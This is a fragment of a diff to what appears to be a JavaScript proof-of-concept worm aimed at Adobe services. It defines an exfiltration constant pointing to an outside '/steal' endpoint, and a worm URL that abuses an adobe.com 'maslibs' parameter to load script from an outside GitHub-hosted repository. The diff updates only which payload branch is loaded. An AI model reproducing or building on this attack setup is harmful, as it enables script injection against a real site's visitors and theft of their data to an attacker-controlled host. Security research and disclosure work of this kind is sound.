@@ -11,7 +11,7 @@
  */
 
 const EXFIL    = 'https://3m1obgl4.instances.poc.jchunt.top/steal';
-const WORM_URL = 'https://www.adobe.com/products/catalog.html?maslibs=cdn.jsdelivr.net/gh/rootd4ddy/mas@main--mas--dev';
+const WORM_URL = 'https://www.adobe.com/products/catalog.html?maslibs=cdn.jsdelivr.net/gh/rootd4ddy/mas@main--mas--v2';
 const INV_HOST = 'https://invitations.adobe.io';
 const AB_HOST  = 'https://ab.adobe-identity.com';
 
